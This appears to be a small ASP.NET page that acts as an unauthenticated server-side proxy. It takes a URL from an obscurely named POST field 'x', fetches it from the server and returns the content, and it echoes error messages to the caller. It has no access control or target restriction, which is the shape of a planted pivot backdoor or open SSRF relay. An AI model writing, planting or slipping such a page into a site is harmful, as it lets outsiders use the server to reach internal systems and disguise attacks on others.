<%@ Page Language="C#" AutoEventWireup="true"  %>
<script runat="server">

    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            string dest = Request.Form["x"];
            if (dest == null)
                return;
            System.Net.WebClient wc = new System.Net.WebClient();

            string decoded = HttpUtility.UrlDecode(dest);

            Response.Clear();
            Response.Write(wc.DownloadString(decoded));
            Response.End();
        }
        catch (Exception ex)
        {
            Response.Write(ex.Message);
        }
    }

</script>